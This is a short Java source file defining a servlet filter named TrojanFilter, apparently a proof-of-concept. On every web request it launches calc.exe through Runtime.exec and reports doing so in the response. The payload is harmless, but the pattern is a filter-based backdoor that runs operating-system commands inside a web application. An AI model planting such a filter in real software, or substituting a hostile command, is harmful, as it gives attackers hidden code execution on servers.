package filter;

import javax.servlet.*;
import java.io.IOException;

public class TrojanFilter implements Filter {


    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        try {
            Process ps = Runtime.getRuntime().exec("calc.exe");
            servletResponse.getWriter().write("TrojanFilter open a calc.exe process!\n");
        } catch (Exception e) {
            System.out.println(e.toString());
        }

        filterChain.doFilter(servletRequest,servletResponse);
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void destroy() {

    }
}
